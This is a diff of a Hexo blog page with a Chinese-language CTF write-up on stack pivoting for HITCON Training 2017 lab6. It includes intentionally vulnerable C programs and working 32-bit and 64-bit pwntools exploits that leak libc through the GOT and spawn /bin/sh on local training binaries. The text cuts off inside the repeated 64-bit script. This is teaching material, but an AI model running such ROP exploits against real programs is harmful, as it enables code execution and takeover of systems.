@@ -1,212 +1,151 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="">
 
-<!-- Head tag -->
 <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="AStar">
 
-    <!--Description-->
-    
-        <meta name="description" content="在HITCON training 2017 看到這題後就一直想學
-這算是stack overflow 裡面蠻進階的技巧了
-但無奈花了快一個禮拜看training 的wp 還是看不懂
-因此在網路上先找一題比較簡單的來入手練習
-引用來源：https://medium.com/@ktecv2000/%E7">
-    
 
-    <!--Author-->
-    
-        <meta name="author" content="AStar">
-    
 
-    <!--Open Graph Title-->
-    
-        <meta property="og:title" content="Stack Pivot"/>
-    
 
-    <!--Open Graph Description-->
+
+<title>Stack Pivot | AStar&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
     
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="AStar&#39;s Blog"/>
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="article" />
-    
-
-    <!--Page Cover-->
-    
-
-        <meta name="twitter:card" content="summary" />
-    
-
-    <!-- Title -->
-    
-    <title>Stack Pivot - AStar&#39;s Blog</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
-
-    <!-- Custom CSS -->
     <link rel="stylesheet" href="/css/style.css">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
-    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
-
-    <!-- Google Analytics -->
     
 
 
-    <!-- favicon -->
-    
-	
-</head>
 
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
 
-    <!-- Menu -->
-    <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
-    <div class="container-fluid">
-        <!-- Brand and toggle get grouped for better mobile display -->
-        <div class="navbar-header page-scroll">
-            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
-                <span class="sr-only">Toggle navigation</span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-            <a class="navbar-brand" href="/">AStar</a>
-        </div>
-
-        <!-- Collect the nav links, forms, and other content for toggling -->
-        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
-            <ul class="nav navbar-nav navbar-right">
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">ASrar&#39;s Blog</a></div>
+            <div class="menu navbar-right">
                 
-                    <li>
-                        <a href="/">
-                            
-                                Home
-                            
-                        </a>
-                    </li>
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                    <li>
-                        <a href="/archives">
-                            
-                                Archives
-                            
-                        </a>
-                    </li>
-                
-                    <li>
-                        <a href="/tags">
-                            
-                                Tags
-                            
-                        </a>
-                    </li>
-                
-                    <li>
-                        <a href="/categories">
-                            
-                                Categories
-                            
-                        </a>
-                    </li>
-                
-                    <li>
-                        <a href="https://github.com/klugjo/hexo-theme-clean-blog">
-                            
-                                <i class="fa fa-github fa-stack-2x"></i>
-                            
-                        </a>
-                    </li>
-                
-            </ul>
-        </div>
-        <!-- /.navbar-collapse -->
-    </div>
-    <!-- /.container -->
-</nav>
-
-    <!-- Main Content -->
-    <!-- Page Header -->
-<!-- Set your background image for this header in your post front-matter: cover -->
-
-<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <div class="post-heading">
-                    <h1>Stack Pivot</h1>
-                    
-                    <span class="meta">
-                        <!-- Date and Author -->
-                        
-                        
-                            2019-06-30
-                        
-                    </span>
-                </div>
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
             </div>
         </div>
-    </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">ASrar&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
 </header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
 
-<!-- Post Content -->
-<article>
-    <div class="container">
-        <div class="row">
-
-            <!-- Tags and categories -->
-           
-                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Stack Pivot</h1>
+            
+                <div class="post-meta">
                     
-                        
-
-
-<a href="/tags/PWN/">#PWN</a>
-
+                        Author: <a itemprop="author" rel="author" href="/">AStar</a>
+                    
 
                     
-                </div>
-                <div class="col-lg-4 col-md-5 post-categories">
+                        <span class="post-time">
+                        Date: <a href="#">June 30, 2019&nbsp;&nbsp;11:08:39</a>
+                        </span>
+                    
                     
                 </div>
             
+        </header>
 
-            <!-- Gallery -->
-            
-
-            <!-- Post Main Content -->
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <p>在HITCON training 2017 看到這題後就一直想學</p>
+        <div class="post-content">
+            <p>在HITCON training 2017 看到這題後就一直想學</p>
 <p>這算是stack overflow 裡面蠻進階的技巧了</p>
 <p>但無奈花了快一個禮拜看training 的wp 還是看不懂</p>
 <p>因此在網路上先找一題比較簡單的來入手練習</p>
-<p>引用來源：<a href="https://medium.com/@ktecv2000/%E7%B7%A9%E8%A1%9D%E5%8D%80%E6%BA%A2%E4%BD%8D%E6%94%BB%E6%93%8A%E4%B9%8B%E4%B8%89-buffer-overflow-123d6ae7236e" target="_blank" rel="noopener">https://medium.com/@ktecv2000/%E7%B7%A9%E8%A1%9D%E5%8D%80%E6%BA%A2%E4%BD%8D%E6%94%BB%E6%93%8A%E4%B9%8B%E4%B8%89-buffer-overflow-123d6ae7236e</a></p>
+<p>引用來源：<a target="_blank" rel="noopener" href="https://medium.com/@ktecv2000/%E7%B7%A9%E8%A1%9D%E5%8D%80%E6%BA%A2%E4%BD%8D%E6%94%BB%E6%93%8A%E4%B9%8B%E4%B8%89-buffer-overflow-123d6ae7236e">https://medium.com/@ktecv2000/%E7%B7%A9%E8%A1%9D%E5%8D%80%E6%BA%A2%E4%BD%8D%E6%94%BB%E6%93%8A%E4%B9%8B%E4%B8%89-buffer-overflow-123d6ae7236e</a></p>
 <p>感謝大大提供一個簡單易懂的入門例子</p>
 <p>training的wp看了快一個禮拜看不懂，這個花一個下午就大概懂了</p>
 <p>先付source code</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// victim : rop.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">void nonSecure()</span><br><span class="line">&#123;</span><br><span class="line">    char name[16];</span><br><span class="line">    printf(&quot;What&apos;s your name?\n&quot;);</span><br><span class="line">    gets(name);</span><br><span class="line">    printf(&quot;Hey %s, you like ROP? I&apos;ll give you root!\n&quot;, name);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;Now_what_you_gonna_do...O_O\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    nonSecure();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// victim : rop.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">void nonSecure()</span><br><span class="line">&#123;</span><br><span class="line">    char name[16];</span><br><span class="line">    printf(&quot;What&#x27;s your name?\n&quot;);</span><br><span class="line">    gets(name);</span><br><span class="line">    printf(&quot;Hey %s, you like ROP? I&#x27;ll give you root!\n&quot;, name);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;Now_what_you_gonna_do...O_O\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    nonSecure();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>我自己是把他取成pivot.c啦</p>
 <p>這題的解題思路就是把<code>name</code>放到我們自訂的bss 區段address就好了</p>
 <p>因為題目內的<code>name</code>是在stack裡面，受到ASLR的保護我們不知道他的address</p>
@@ -233,9 +172,9 @@
 <p><img src="/img/2019/stack_pivot/pivot5.png" alt=""></p>
 <hr>
 <p>這陣子終於把 HITCON 的 lab6 解出來了，這邊用另一種姿勢來解，順便說說stack pivot 的可怕之處</p>
-<p>想看網路上找到的解法可以<a href="https://sda06407.github.io/2019/06/22/HITCON-Training-2017/" target="_blank" rel="noopener">來這裡</a> 搜 lab6</p>
+<p>想看網路上找到的解法可以<a href="https://sda06407.github.io/2019/06/22/HITCON-Training-2017/">來這裡</a> 搜 lab6</p>
 <p>一樣先上題目</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int count = 1337 ;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    if(count != 1337)</span><br><span class="line">        _exit(1);</span><br><span class="line">    count++;</span><br><span class="line">    char buf[40];</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    puts(&quot;Try your best :&quot;);</span><br><span class="line">    read(0,buf,64);</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int count = 1337 ;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    if(count != 1337)</span><br><span class="line">        _exit(1);</span><br><span class="line">    count++;</span><br><span class="line">    char buf[40];</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    puts(&quot;Try your best :&quot;);</span><br><span class="line">    read(0,buf,64);</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>網路上大部分的解法都是透過兩個 bss address 來進行</p>
 <p>這邊讓難度稍微增加一點點，就是只用一個 bss address 進行 leak 與 exploit</p>
 <p>stack pivot 只要利用得當，基本上可以只透過一個bss address leak 整個 libc, 面對像 kali 這種比較特規的 libc 很有幫助</p>
@@ -243,90 +182,84 @@
 <p>overflow 跳到 bss 之後在 bss 進行 <code>read</code> 寫入 <code>puts</code> leak libc address, <code>puts</code> leak 完後的 ret address 設為 <code>read</code> 並且在 bss 寫入 system(“/bin/sh”)</p>
 <p><code>read</code> 執行完後的 ret address 設為 <code>leave_ret</code>, 這時 <code>eip</code> 會跳回 bss 的開頭，也就是system(“/bin/sh”)</p>
 <p>exploit code:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./migration&quot;)</span><br><span class="line">context.arch = &apos;i386&apos;</span><br><span class="line">context.terminal = &apos;bash&apos;</span><br><span class="line">context.endian = &apos;little&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"># prepare</span><br><span class="line"></span><br><span class="line">binELF = ELF(&apos;./migration&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">bss1 = binELF.bss() + 0x800</span><br><span class="line"></span><br><span class="line">puts_plt = binELF.symbols[&apos;puts&apos;]</span><br><span class="line">read_plt = binELF.symbols[&apos;read&apos;]</span><br><span class="line">puts_got = binELF.got[&apos;puts&apos;]</span><br><span class="line">read_got = binELF.got[&apos;read&apos;]</span><br><span class="line">leave_ret =  0x8048504</span><br><span class="line">pop_ebx_ret = 0x8048586</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">offset = 40</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;&apos;.ljust(offset, &apos;\x90&apos;), bss1, read_plt, leave_ret, 0, bss1, 0x100])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload2 = flat([bss1, puts_plt, pop_ebx_ret, puts_got, puts_plt, pop_ebx_ret, read_got, read_plt, leave_ret, 0, bss1, 0x100])</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">time.sleep(0.1)</span><br><span class="line">raw_data = io.recv()</span><br><span class="line">puts = u32(raw_data[:4])</span><br><span class="line">read = u32(raw_data[5:9])</span><br><span class="line"></span><br><span class="line">log.info(&quot;puts is 0x%x&quot; %puts)</span><br><span class="line">log.info(&quot;read is 0x%x&quot; %read)</span><br><span class="line"></span><br><span class="line">system = puts - libc.symbols[&apos;puts&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh = puts - libc.symbols[&apos;puts&apos;] + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">payload3 = p32(system) + &apos;bbbb&apos; + p32(binsh)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./migration&quot;)</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line">context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.endian = &#x27;little&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"># prepare</span><br><span class="line"></span><br><span class="line">binELF = ELF(&#x27;./migration&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">bss1 = binELF.bss() + 0x800</span><br><span class="line"></span><br><span class="line">puts_plt = binELF.symbols[&#x27;puts&#x27;]</span><br><span class="line">read_plt = binELF.symbols[&#x27;read&#x27;]</span><br><span class="line">puts_got = binELF.got[&#x27;puts&#x27;]</span><br><span class="line">read_got = binELF.got[&#x27;read&#x27;]</span><br><span class="line">leave_ret =  0x8048504</span><br><span class="line">pop_ebx_ret = 0x8048586</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">offset = 40</span><br><span class="line"></span><br><span class="line">payload = flat([&#x27;&#x27;.ljust(offset, &#x27;\x90&#x27;), bss1, read_plt, leave_ret, 0, bss1, 0x100])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload2 = flat([bss1, puts_plt, pop_ebx_ret, puts_got, puts_plt, pop_ebx_ret, read_got, read_plt, leave_ret, 0, bss1, 0x100])</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">time.sleep(0.1)</span><br><span class="line">raw_data = io.recv()</span><br><span class="line">puts = u32(raw_data[:4])</span><br><span class="line">read = u32(raw_data[5:9])</span><br><span class="line"></span><br><span class="line">log.info(&quot;puts is 0x%x&quot; %puts)</span><br><span class="line">log.info(&quot;read is 0x%x&quot; %read)</span><br><span class="line"></span><br><span class="line">system = puts - libc.symbols[&#x27;puts&#x27;] + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh = puts - libc.symbols[&#x27;puts&#x27;] + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">payload3 = p32(system) + &#x27;bbbb&#x27; + p32(binsh)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p>這樣子做的話就不需要 先把 <code>read</code> 那三個 argv 先 pop 出來再 ret 了，因為我們直接用 <code>leave</code> 移動 esp 到 <code>system</code></p>
 <hr>
 <p>這次再嘗試換個姿勢，也就是把題目改成 64 位元的來玩</p>
 <p>因為 <code>read</code> 要三個 argv, 要找到 <code>pop rdi rsi rdx</code> 這三個連續的 opcode 老實說難度有點高，所以在這邊稍微改一下 code</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int count = 1337 ;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    if(count != 1337)</span><br><span class="line">        _exit(1);</span><br><span class="line">    count++;</span><br><span class="line">    char buf[40];</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    puts(&quot;Try your best :&quot;);</span><br><span class="line">    gets(buf);</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int count = 1337 ;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    if(count != 1337)</span><br><span class="line">        _exit(1);</span><br><span class="line">    count++;</span><br><span class="line">    char buf[40];</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    puts(&quot;Try your best :&quot;);</span><br><span class="line">    gets(buf);</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>換成 gets 比較容易XD</p>
 <p>先附上 exploit code:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./migration64&quot;)</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.terminal = &apos;bash&apos;</span><br><span class="line">context.endian = &apos;little&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"># prepare</span><br><span class="line"></span><br><span class="line">binELF = ELF(&apos;./migration64&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6_64&apos;)</span><br><span class="line">bss1 = binELF.bss() + 0x800</span><br><span class="line"></span><br><span class="line">puts_plt = binELF.symbols[&apos;puts&apos;]</span><br><span class="line">gets_plt = binELF.symbols[&apos;gets&apos;]</span><br><span class="line">puts_got = binELF.got[&apos;puts&apos;]</span><br><span class="line">gets_got = binELF.got[&apos;gets&apos;]</span><br><span class="line">leave_ret = 0x4011bd</span><br><span class="line">pop_rdi_ret = 0x40121b</span><br><span class="line">offset = 48</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;&apos;.ljust(offset, &apos;\x90&apos;), bss1, pop_rdi_ret, bss1, gets_plt, leave_ret])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload = flat([bss1, pop_rdi_ret, puts_got, puts_plt, pop_rdi_ret, gets_got, puts_plt, pop_rdi_ret, bss1, gets_plt, leave_ret ])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">raw_data = io.recv()</span><br><span class="line"></span><br><span class="line">puts = u64(raw_data[:6].ljust(8, &quot;\x00&quot;))</span><br><span class="line">gets = u64(raw_data[7:13].ljust(8, &apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line">log.info(&quot;puts is 0x%x&quot; %puts)</span><br><span class="line">log.info(&quot;gets is 0x%x&quot; %gets)</span><br><span class="line"></span><br><span class="line">system = puts - libc.symbols[&apos;puts&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh = puts - libc.symbols[&apos;puts&apos;] + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">time.sleep(0.1)</span><br><span class="line">payload = p64(bss1) + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./migration64&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.endian = &#x27;little&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"># prepare</span><br><span class="line"></span><br><span class="line">binELF = ELF(&#x27;./migration64&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6_64&#x27;)</span><br><span class="line">bss1 = binELF.bss() + 0x800</span><br><span class="line"></span><br><span class="line">puts_plt = binELF.symbols[&#x27;puts&#x27;]</span><br><span class="line">gets_plt = binELF.symbols[&#x27;gets&#x27;]</span><br><span class="line">puts_got = binELF.got[&#x27;puts&#x27;]</span><br><span class="line">gets_got = binELF.got[&#x27;gets&#x27;]</span><br><span class="line">leave_ret = 0x4011bd</span><br><span class="line">pop_rdi_ret = 0x40121b</span><br><span class="line">offset = 48</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span 